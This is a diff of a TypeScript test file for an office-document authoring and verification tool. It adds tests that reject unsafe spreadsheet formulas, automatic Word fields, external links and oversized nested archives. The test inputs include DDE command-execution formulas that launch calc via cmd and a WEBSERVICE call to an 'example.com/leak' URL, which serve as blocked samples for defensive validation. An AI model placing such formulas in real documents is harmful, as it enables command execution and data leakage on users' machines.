@@ -7,12 +7,15 @@ import { promisify } from "node:util";
 import ExcelJS from "exceljs";
 import { strFromU8, strToU8, unzipSync, zipSync } from "fflate";
 import { describe, expect, it } from "vitest";
+import { z } from "zod";
 import { authorOfficeDocument } from "./document-author";
 import { documentAuthoringSchema } from "./document-authoring-schema";
 import {
+  deriveOfficeVerification,
   executeOfficeDocument,
   formatOfficeComDiagnostic,
   inspectOfficeComPackageBoundary,
+  interpretOfficeComProcessResult,
   officeComStageLabel,
   officeDocumentAssets,
   officeDocumentSourcePath,
@@ -22,7 +25,12 @@ import {
   parseOfficeProcessOwner,
   verifyWithMicrosoftOffice,
 } from "./office-document";
-import { assertOfficeInputExtensions, officeDocumentSchema } from "./office-document-schema";
+import {
+  assertOfficeInputExtensions,
+  officeDocumentSchema,
+  officeFormulaIsUnsafe,
+} from "./office-document-schema";
+import { embedWorkbookInDocx, embedWorkbookInXlsx } from "./office-package-test-fixtures";
 
 const execFileAsync = promisify(execFile);
 
@@ -38,6 +46,21 @@ async function workbookBytes(extra: Record<string, Uint8Array> = {}): Promise<Bu
   sheet.getCell("C2").value = { formula: "A2-B2", result: 450 };
   const archive = unzipSync(Buffer.from(await workbook.xlsx.writeBuffer()));
   return Buffer.from(zipSync({ ...archive, ...extra }));
+}
+
+function declareFirstZipEntrySize(bytes: Uint8Array, declared: number): Buffer {
+  const output = Buffer.from(bytes);
+  for (const [signature, sizeOffset] of [
+    [0x04034b50, 22],
+    [0x02014b50, 24],
+  ] as const) {
+    const marker = Buffer.alloc(4);
+    marker.writeUInt32LE(signature);
+    const offset = output.indexOf(marker);
+    expect(offset).toBeGreaterThanOrEqual(0);
+    output.writeUInt32LE(declared, offset + sizeOffset);
+  }
+  return output;
 }
 
 function docxFixture(body: string, relationships = ""): Buffer {
@@ -124,7 +147,53 @@ describe("office_document", () => {
     });
   });
 
-  it("rejects non-hyperlink external relationships and split automatic fields for Word COM only", async () => {
+  it("keeps safe DOCX hyperlinks and charts available to structural verification", async () => {
+    const archive = unzipSync(
+      docxFixture(
+        '<w:p><w:hyperlink r:id="rIdHyperlink"><w:r><w:t>Reference site</w:t></w:r></w:hyperlink></w:p>',
+        '<Relationship Id="rIdHyperlink" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/>' +
+          '<Relationship Id="rIdChart" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="charts/chart1.xml"/>',
+      ),
+    );
+    const source = Buffer.from(
+      zipSync({
+        ...archive,
+        "word/charts/chart1.xml": strToU8(
+          '<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"/>',
+        ),
+      }),
+    );
+    const result = await executeOfficeDocument(
+      { operation: "verify", path: "safe-links-and-chart.docx", render: false },
+      new Map([["safe-links-and-chart.docx", source]]),
+    );
+    expect(result.output).toContain("DOCX 结构通过");
+    expect(result.verification?.status).toBe("verified");
+  });
+
+  it("rejects dangerous formulas in embedded XLSX before DOCX Office verification", async () => {
+    const embeddedWorkbook = new ExcelJS.Workbook();
+    embeddedWorkbook.addWorksheet("Data").getCell("A1").value = {
+      formula: 'WEBSERVICE("https://example.com/leak")',
+      result: "",
+    };
+    const embedded = Buffer.from(await embeddedWorkbook.xlsx.writeBuffer());
+    const source = embedWorkbookInDocx(
+      docxFixture("<w:p><w:r><w:t>Embedded workbook</w:t></w:r></w:p>"),
+      embedded,
+    );
+
+    await expect(
+      executeOfficeDocument(
+        { operation: "verify", path: "embedded-formula.docx", render: true },
+        new Map([["embedded-formula.docx", source]]),
+        undefined,
+        { canUseOffice: true },
+      ),
+    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
+  });
+
+  it("rejects non-hyperlink relationships and split automatic fields before Word COM", async () => {
     const externalImage = docxFixture(
       "<w:p><w:r><w:t>External image fixture</w:t></w:r></w:p>",
       '<Relationship Id="rIdImage" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="https://example.com/image.png" TargetMode="External"/>',
@@ -136,9 +205,27 @@ describe("office_document", () => {
     const splitInclude = docxFixture(
       '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDE</w:instrText></w:r><w:r><w:instrText xml:space="preserve">TEXT "external.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Included</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
     );
-    expect(inspectOfficeComPackageBoundary(splitInclude, ".docx").reasons).toContain(
-      "DOCX_AUTOMATIC_FIELD_INCLUDETEXT",
-    );
+    for (const [left, right, field] of [
+      ["INCLUDE", "TEXT", "INCLUDETEXT"],
+      ["INCLUDE", "PICTURE", "INCLUDEPICTURE"],
+      ["DDE", "AUTO", "DDEAUTO"],
+      ["DATA", "BASE", "DATABASE"],
+      ["LI", "NK", "LINK"],
+      ["EM", "BED", "EMBED"],
+      ["MACRO", "BUTTON", "MACROBUTTON"],
+    ]) {
+      const source = docxFixture(
+        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>' +
+          `<w:r><w:instrText xml:space="preserve"> ${left}</w:instrText></w:r>` +
+          `<w:r><w:instrText xml:space="preserve">${right} &quot;fixture&quot;</w:instrText></w:r>` +
+          '<w:r><w:fldChar w:fldCharType="separate"/></w:r>' +
+          "<w:r><w:t>Field</w:t></w:r>" +
+          '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>',
+      );
+      expect(inspectOfficeComPackageBoundary(source, ".docx").reasons).toContain(
+        `DOCX_AUTOMATIC_FIELD_${field}`,
+      );
+    }
     for (const field of ["INCLUDEPICTURE", "LINK", "DDE", "DDEAUTO", "DATABASE"]) {
       const source = docxFixture(
         `<w:p><w:fldSimple w:instr=" ${field} &quot;fixture&quot; "><w:r><w:t>Field</w:t></w:r></w:fldSimple></w:p>`,
@@ -148,16 +235,14 @@ describe("office_document", () => {
       );
     }
 
-    const result = await executeOfficeDocument(
-      { operation: "verify", path: "automatic-field.docx", render: true },
-      new Map([["automatic-field.docx", splitInclude]]),
-      undefined,
-      { canUseOffice: true },
-    );
-    expect(result.output).toContain("Microsoft Office 验证：unavailable");
-    expect(result.output).toContain("自动字段 INCLUDETEXT");
-    expect(result.warnings.join("\n")).toContain("未启动 Office");
-    expect(result.rendition).toBeUndefined();
+    await expect(
+      executeOfficeDocument(
+        { operation: "verify", path: "automatic-field.docx", render: true },
+        new Map([["automatic-field.docx", splitInclude]]),
+        undefined,
+        { canUseOffice: true },
+      ),
+    ).rejects.toThrow("DOCX_ACTIVE_FIELD_UNSUPPORTED");
   });
 
   it("rejects XLSX data-connection parts only at the Office COM boundary", async () => {
@@ -196,6 +281,116 @@ describe("office_document", () => {
     });
     expect(() => parseA1Range("D9:B2")).toThrow("A1_RANGE_ORDER");
     expect(() => parseA1Range("XFE1")).toThrow("A1_RANGE_LIMIT");
+  });
+
+  it("keeps the office schema convertible for the model tool definition", () => {
+    const json = z.toJSONSchema(officeDocumentSchema, { target: "draft-7" });
+    expect(JSON.stringify(json)).toContain('"operation"');
+  });
+
+  it("rejects active formulas and external workbook references before authoring", () => {
+    for (const formula of [
+      'WEBSERVICE("https://example.com/leak")',
+      'RTD("prog.id",,1)',
+      'DDE("cmd","/c calc","")',
+      "'[outside.xlsx]Sheet1'!A1",
+      "'//server/share/book.xlsx'!A1",
+    ]) {
+      expect(() =>
+        officeDocumentSchema.parse({
+          operation: "create_spreadsheet",
+          path: "unsafe.xlsx",
+          workbook: {
+            sheets: [
+              {
+                name: "Data",
+                cells: [{ row: 1, column: 1, value: { formula } }],
+              },
+            ],
+          },
+        }),
+      ).toThrow("公式含主动外部调用或危险函数");
+    }
+  });
+
+  it("allows structured table references while rejecting active and external workbook formulas", () => {
+    for (const formula of [
+      "SUM(Sales[Revenue])",
+      "[@Amount]",
+      "SUM(Table1[[#This Row],[Revenue]])",
+      "Sales[Revenue] * 1.2",
+      "IF([@Amount] > 0, SUM(Sales[Revenue]), 0)",
+    ])
+      expect(officeFormulaIsUnsafe(formula), formula).toBe(false);
+
+    for (const formula of [
+      "[book.xlsx]Sheet1!A1",
+      "'[book.xlsx]Sheet 1'!$A$1",
+      "[1]Sheet1!A1",
+      "'C:\\Reports\\[book.xlsx]Sheet1'!A1",
+      "'\\\\server\\share\\[book.xlsx]Sheet1'!A1",
+      'EXTERNAL("book","Sheet1!A1")',
+      'WEBSERVICE("https://example.com/leak")',
+      'RTD("prog.id",,1)',
+      'DDE("cmd","/c calc","")',
+      "cmd|'/c calc'!A0",
+      'IMAGE("https://example.com/image.png")',
+      'STOCKHISTORY("AAPL","2026-01-01","2026-02-01")',
+      'CUBEMEMBER("ThisWorkbookDataModel","[Measures].[Revenue]")',
+      'CUBEVALUE("ThisWorkbookDataModel","[Measures].[Revenue]")',
+    ])
+      expect(officeFormulaIsUnsafe(formula), formula).toBe(true);
+  });
+
+  it("enforces one cumulative work budget across spreadsheet operations", () => {
+    expect(() =>
+      officeDocumentSchema.parse({
+        operation: "edit_spreadsheet",
+        path: "output.xlsx",
+        source: { path: "source.xlsx", expected_sha256: "0".repeat(64) },
+        operations: Array.from({ length: 51 }, () => ({
+          type: "style_range",
+          sheet: "Data",
+          range: "A1:Z1000",
+          style: { font: { bold: true } },
+        })),
+      }),
+    ).toThrow("电子表格请求累计工作量不能超过");
+
+    expect(() =>
+      officeDocumentSchema.parse({
+        operation: "create_spreadsheet",
+        path: "large.xlsx",
+        workbook: {
+          sheets: Array.from({ length: 3 }, (_, sheetIndex) => ({
+            name: `Sheet${sheetIndex + 1}`,
+            cells: Array.from({ length: 34_000 }, (_, index) => ({
+              row: Math.floor(index / 100) + 1,
+              column: (index % 100) + 1,
+              value: index,
+            })),
+          })),
+        },
+      }),
+    ).toThrow("电子表格请求累计工作量不能超过");
+  });
+
+  it("rejects active formulas in existing workbooks at inspect and COM boundaries", async () => {
+    const workbook = new ExcelJS.Workbook();
+    workbook.addWorksheet("Data").getCell("A1").value = {
+      formula: 'WEBSERVICE("https://example.com/leak")',
+      result: "",
+    };
+    const source = Buffer.from(await workbook.xlsx.writeBuffer());
+    expect(inspectOfficeComPackageBoundary(source, ".xlsx").reasons).toContain(
+      "XLSX_ACTIVE_FORMULA",
+    );
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "unsafe.xlsx" },
+        new Map([["unsafe.xlsx", source]]),
+      ),
+    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
   });
 
   it("creates a styled workbook with formulas, merged cells, filters and a native table", async () => {
@@ -438,6 +633,90 @@ describe("office_document", () => {
     ).rejects.toThrow("OFFICE_UNSUPPORTED_PART");
   });
 
+  it("budgets nested XLSX decompression before expanding embeds", async () => {
+    const embedded = Buffer.from(
+      zipSync({
+        "xl/workbook.xml": strToU8("<workbook/>"),
+        "payload.bin": new Uint8Array([1, 2, 3]),
+      }),
+    );
+    const oversized = declareFirstZipEntrySize(embedded, 32 * 1024 * 1024 + 1);
+    const outer = embedWorkbookInXlsx(await workbookBytes(), oversized);
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "nested.xlsx" },
+        new Map([["nested.xlsx", outer]]),
+      ),
+    ).rejects.toThrow("嵌入工作簿");
+  });
+
+  it("enforces cumulative embedded archive size, entries and recursion depth", async () => {
+    const sizeableEmbedded = await workbookBytes({
+      "xl/payload.bin": new Uint8Array(26 * 1024 * 1024),
+    });
+    let cumulative = await workbookBytes();
+    for (let index = 1; index <= 4; index += 1)
+      cumulative = embedWorkbookInXlsx(cumulative, sizeableEmbedded, {
+        partName: `xl/embeddings/item${index}.xlsx`,
+      });
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "cumulative.xlsx" },
+        new Map([["cumulative.xlsx", cumulative]]),
+      ),
+    ).rejects.toThrow("累计声明解压大小");
+
+    const manyEntries = await workbookBytes(
+      Object.fromEntries(
+        Array.from({ length: 2_001 }, (_, index) => [
+          `xl/payload-${index}.bin`,
+          new Uint8Array([1]),
+        ]),
+      ),
+    );
+    const entryHeavy = embedWorkbookInXlsx(
+      embedWorkbookInXlsx(await workbookBytes(), manyEntries, {
+        partName: "xl/embeddings/one.xlsx",
+      }),
+      manyEntries,
+      { partName: "xl/embeddings/two.xlsx" },
+    );
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "entry-heavy.xlsx" },
+        new Map([["entry-heavy.xlsx", entryHeavy]]),
+      ),
+    ).rejects.toThrow("累计 ZIP 条目");
+
+    let nested = await workbookBytes();
+    for (let depth = 1; depth <= 5; depth += 1)
+      nested = embedWorkbookInXlsx(nested, nested, {
+        partName: `xl/embeddings/depth-${depth}.xlsx`,
+      });
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "deep.xlsx" },
+        new Map([["deep.xlsx", nested]]),
+      ),
+    ).rejects.toThrow("递归深度");
+  });
+
+  it("rejects dangerous formulas inside embedded XLSX packages", async () => {
+    const embeddedWorkbook = new ExcelJS.Workbook();
+    embeddedWorkbook.addWorksheet("Data").getCell("A1").value = {
+      formula: 'WEBSERVICE("https://example.com/leak")',
+      result: "",
+    };
+    const embedded = Buffer.from(await embeddedWorkbook.xlsx.writeBuffer());
+    const outer = embedWorkbookInXlsx(await workbookBytes(), embedded);
+    await expect(
+      executeOfficeDocument(
+        { operation: "inspect", path: "nested-formula.xlsx" },
+        new Map([["nested-formula.xlsx", outer]]),
+      ),
+    ).rejects.toThrow("OFFICE_UNSAFE_FORMULA");
+  });
+
   it("edits PPTX shape, table and notes anchors while preserving unrelated parts", async () => {
     const source = await authorOfficeDocument(
       documentAuthoringSchema.parse({
@@ -541,6 +820,122 @@ describe("office_document", () => {
     expect(result.warnings.join("\n")).toContain("不允许启用宿主 Microsoft Office");
     expect(result.rendition).toBeUndefined();
     expect(result.recalculatedBytes).toBeUndefined();
+    expect(result.verification).toEqual({
+      status: "unavailable",
+      render: "unavailable",
+      recalculation: "unavailable",
+    });
+  });
+
+  it("reports structural-only and sampled formula verification as partial", async () => {
+    const workbook = new ExcelJS.Workbook();
+    const sheet = workbook.addWorksheet("Large");
+    for (let row = 1; row <= 2_001; row++) sheet.getCell(row, 1).value = row;
+    const source = Buffer.from(await workbook.xlsx.writeBuffer());
+
+    const structuralOnly = await executeOfficeDocument(
+      {
+        operation: "verify",
+        path: "large.xlsx",
+        render: false,
+        recalculate: false,
+      },
+      new Map([["large.xlsx", source]]),
+    );
+    expect(structuralOnly.verification).toEqual({
+      status: "partial",
+      render: "not_requested",
+      recalculation: "not_requested",
+    });
+    expect(structuralOnly.output).toContain("公式扫描为 partial");
+  });
+
+  it("derives authoritative verification states for export and recalculation outcomes", () => {
+    expect(
+      deriveOfficeVerification({
+        officeStatus: "verified",
+        render: "verified",
+        recalculation: "not_requested",
+        structuralPartial: false,
+      }),
+    ).toEqual({
+      status: "verified",
+      render: "verified",
+      recalculation: "not_requested",
+    });
+    expect(
+      deriveOfficeVerification({
+        officeStatus: "verified",
+        render: "verified",
+        recalculation: "partial",
+        structuralPartial: false,
+      }),
+    ).toEqual({
+      status: "partial",
+      render: "verified",
+      recalculation: "partial",
+    });
+    expect(
+      deriveOfficeVerification({
+        officeStatus: "verified",
+        render: "failed",
+        recalculation: "failed",
+        structuralPartial: false,
+      }).status,
+    ).toBe("failed");
+    expect(
+      deriveOfficeVerification({
+        officeStatus: "unavailable",
+        render: "unavailable",
+        recalculation: "unavailable",
+        structuralPartial: false,
+      }).status,
+    ).toBe("unavailable");
+  });
+
+  it("fails closed when Office COM omits or contradicts its authoritative JSON status", () => {
+    expect(
+      interpretOfficeComProcessResult({
+        code: 0,
+        stdout: '{"event":"office-stage","stage":"completed"}',
+        stderr: "",
+      }).status,
+    ).toBe("failed");
+    expect(
+      interpretOfficeComProcessResult({
+        code: 0,
+        stdout: '{"message":"completed"}',
+        stderr: "",
+      }).status,
+    ).toBe("failed");
+    expect(
+      interpretOfficeComProcessResult({
+        code: 1,
+        stdout: '{"status":"verified","message":"reported success"}',
+        stderr: "",
+      }).status,
+    ).toBe("failed");
+    expect(
+      interpretOfficeComProcessResult({
+        code: 0,
+        stdout: '{"status":"unknown","message":"unexpected state"}',
+        stderr: "",
+      }).status,
+    ).toBe("failed");
+    expect(
+      interpretOfficeComProcessResult({
+        code: 0,
+        stdout: '{"status":"unavailable","message":"Office is blocked"}',
+        stderr: "",
+      }),
+    ).toEqual({ status: "unavailable", message: "Office is blocked" });
+    expect(
+      interpretOfficeComProcessResult({
+        code: 0,
+        stdout: '{"status":"verified","message":"verified"}',
+        stderr: "",
+      }),
+    ).toEqual({ status: "verified", message: "verified" });
   });
 
   it("requires explicit verify output paths and rejects unsafe overwrite targets", () => {
